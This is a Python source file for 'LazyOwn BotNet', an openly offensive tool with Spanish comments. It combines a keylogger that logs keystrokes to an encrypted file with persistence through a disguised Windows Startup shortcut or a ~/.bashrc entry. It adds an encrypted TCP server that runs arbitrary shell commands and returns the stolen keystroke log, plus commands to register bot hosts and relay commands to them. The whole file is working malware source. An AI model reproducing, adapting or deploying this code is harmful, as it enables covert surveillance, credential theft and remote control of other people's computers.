#!/usr/bin/env python3 
#_*_ coding: utf8 _*_
"""
main.py

Autor: Gris Iscomeback 
Correo electrónico: grisiscomeback[at]gmail[dot]com
Fecha de creación: 09/06/2024
Licencia: GPL v3

Descripción: Servidor LazyOwn BotNet

██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
██║     ███████║  ███╔╝  ╚████╔╝ ██║   ██║██║ █╗ ██║██╔██╗ ██║
██║     ██╔══██║ ███╔╝    ╚██╔╝  ██║   ██║██║███╗██║██║╚██╗██║
███████╗██║  ██║███████╗   ██║   ╚██████╔╝╚███╔███╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝

"""
import os
import platform
import threading
import socket
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from pynput import keyboard
import subprocess
import argparse
import binascii

# Asegúrate de instalar pywin32 si estás en Windows
try:
    import win32com.client
    import ctypes
    import win32api
    import win32con
except ImportError:
    win32com = None

KEY_SIZE = 16  # 16 bytes para AES-128, 24 bytes para AES-192, 32 bytes para AES-256

def encrypt(plaintext, key):
    plaintext = pad(plaintext.encode('utf-8'), AES.block_size)
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(plaintext)

def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return unpad(plaintext, AES.block_size).decode('utf-8')

def add_to_botnet(ip, port, botnet_file):
    with open(botnet_file, 'a') as f:
        f.write(f'{ip}:{port}\n')

def clean_botnet(ip, port, botnet_file):
    if os.path.exists(botnet_file):
        with open(botnet_file, 'r') as f:
            lines = f.readlines()
        with open(botnet_file, 'w') as f:
            for line in lines:
                if line.strip("\n") != f"{ip}:{port}":
                    f.write(line)

def send_to_botnet(cmd, key, botnet_file):
    if os.path.exists(botnet_file):
        with open(botnet_file, 'r') as f:
            clients = f.readlines()

        for client in clients:
            ip, port = client.strip().split(':')
            try:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                conn.connect((ip, int(port)))
                conn.send(encrypt(cmd, key))
                data = conn.recv(4096)
                result = decrypt(data, key)
                print(f'[;,;] {ip}:{port} -> {result}')
                conn.close()
            except Exception as e:
                print(f'[-] Error sending to {ip}:{port} - {e}')

class Keylogger:
    def __init__(self, key, log_file):
        self.log = ""
        self.key = key
        self.hidden_file = log_file

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f" [{str(key)}] "

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def get_log(self):
        return self.log

    def save_log(self):
        print(f"Pulsaciones sin cifrar: {self.log}")
        encrypted_log = encrypt(self.log, self.key)
        with open(self.hidden_file, "ab") as log_file:
            log_file.write(encrypted_log + b"\n")
        self.log = ""

    def run(self):
        while True:
            self.save_log()
            time.sleep(60)

    def setup_persistence(self):
        if platform.system() == "Windows" and win32com:
            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            script_path = os.path.abspath(__file__)
            shortcut_path = os.path.join(startup_folder, "system32_log.lnk")
            self.create_shortcut(script_path, shortcut_path)
        elif platform.system() == "Linux":
            bashrc_file = os.path.expanduser('~/.bashrc')
            with open(bashrc_file, 'a') as f:
                f.write(f'\n# Start keylogger\npython3 {os.path.abspath(__file__)} &\n')

    def create_shortcut(self, script_path, shortcut_path):
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()

def handle_client(conn, key, botnet_file, log_file):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            cmd = decrypt(data, key)
            if cmd == 'GET_LOG':
                if os.path.exists(log_file):
                    with open(log_file, 'rb') as f:
                        encrypted_log = f.read()
                    decrypted_log = decrypt(encrypted_log, key)
                    conn.send(encrypt(decrypted_log, key))
                else:
                    conn.send(encrypt('No log file found', key))
            elif cmd.startswith('EXEC'):
                cmd_result = subprocess.getoutput(cmd[5:])
                conn.send(encrypt(cmd_result, key))
            elif cmd.startswith('CLEAN_BOTNET'):
                ip, port = cmd.split()[1:]
                clean_botnet(ip, port, botnet_file)
                conn.send(encrypt('Botnet cleaned', key))
            elif cmd.startswith('ADD_TO_BOTNET'):
                ip, port = cmd.split()[1:]
                add_to_botnet(ip, port, botnet_file)
                conn.send(encrypt('Added to botnet', key))
            elif cmd.startswith('SEND_TO_BOTNET'):
                send_cmd = cmd.split(' ', 1)[1]
                send_to_botnet(send_cmd, key, botnet_file)
                conn.send(encrypt('Command sent to botnet', key))
            else:
                result = subprocess.getoutput(cmd)
                conn.send(encrypt(result, key))
    except Exception as e:
        conn.send(encrypt(f'Error: {e}', key))
    finally:
        conn.close()

def start_server(host, port, key, botnet_file, log_file):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f'[+] Servidor escuchando en {host}:{port}')
    keylogger = Keylogger(key, log_file)
    threading.Thread(target=keylogger.run, daemon=True).start()
    while True:
        conn, addr = server.accept()
        print(f'[+] Conexión aceptada de {addr[0]}:{addr[1]}')
        threading.Thread(target=handle_client, args=(conn, key, botnet_file, log_file)).start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='LazyOwnBotNet Server')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind the server')
    parser.add_argument('--port', type=int, default=12345, help='Port to bind the server')
    parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
    args = parser.parse_args()
    BANNER = """
                                                                                                    
    @@@        @@@@@@   @@@@@@@@  @@@ @@@   @@@@@@   @@@  @@@  @@@  @@@  @@@                          
    @@@       @@@@@@@@  @@@@@@@@  @@@ @@@  @@@@@@@@  @@@  @@@  @@@  @@@@ @@@                          
    @@!       @@!  @@@       @@!  @@! !@@  @@!  @@@  @@!  @@!  @@!  @@!@!@@@                          
    !@!       !@!  @!@      !@!   !@! @!!  !@!  @!@  !@!  !@!  !@!  !@!!@!@!                          
    @!!       @!@!@!@!     @!!     !@!@!   @!@  !@!  @!!  !!@  @!@  @!@ !!@!                          
    !!!       !!!@!!!!    !!!       @!!!   !@!  !!!  !@!  !!!  !@!  !@!  !!!                          
    !!:       !!:  !!!   !!:        !!:    !!:  !!!  !!:  !!:  !!:  !!:  !!!                          
    :!:      :!:  !:!  :!:         :!:    :!:  !:!  :!:  :!:  :!:  :!:  !:!                          
    :: ::::  ::   :::   :: ::::     ::    ::::: ::   :::: :: :::    ::   ::                          
    : :: : :   :   : :  : :: : :     :      : :  :     :: :  : :    ::    :                           
                                                                                                    
                                                                                                    
    @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@@@@   @@@@@@@@  @@@  @@@  @@@   @@@@@@   @@@@@@@   @@@  @@@  
    @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  @@@@@@@@  @@@  @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
    @@!       @@!  @@@  @@!  @@@  @@! @@! @@!  @@!       @@!  @@!  @@!  @@!  @@@  @@!  @@@  @@!  !@@  
    !@!       !@!  @!@  !@!  @!@  !@! !@! !@!  !@!       !@!  !@!  !@!  !@!  @!@  !@!  @!@  !@!  @!!  
    @!!!:!    @!@!!@!   @!@!@!@!  @!! !!@ @!@  @!!!:!    @!!  !!@  @!@  @!@  !@!  @!@!!@!   @!@@!@!   
    !!!!!:    !!@!@!    !!!@!!!!  !@!   ! !@!  !!!!!:    !@!  !!!  !@!  !@!  !!!  !!@!@!    !!@!!!    
    !!:       !!: :!!   !!:  !!!  !!:     !!:  !!:       !!:  !!:  !!:  !!:  !!!  !!: :!!   !!: :!!   
    :!:       :!:  !:!  :!:  !:!  :!:     :!:  :!:       :!:  :!:  :!:  :!:  !:!  :!:  !:!  :!:  !:!  
    ::       ::   :::  ::   :::  :::     ::    :: ::::   :::: :: :::   ::::: ::  ::   :::   ::  :::  
    :         :   : :   :   : :   :      :    : :: ::     :: :  : :     : :  :    :   : :   :   :::  
                                                                                                    
    [*] Iniciando: LazyBotNet [;,;]
    """
    print(BANNER)
    host = args.host
    port = args.port
    key = binascii.unhexlify(args.key)[:KEY_SIZE]
    botnet_file = "lazybotnet.own"
    log_file = "lazybotnet.log"

    start_server(host, port, key, botnet_file, log_file)
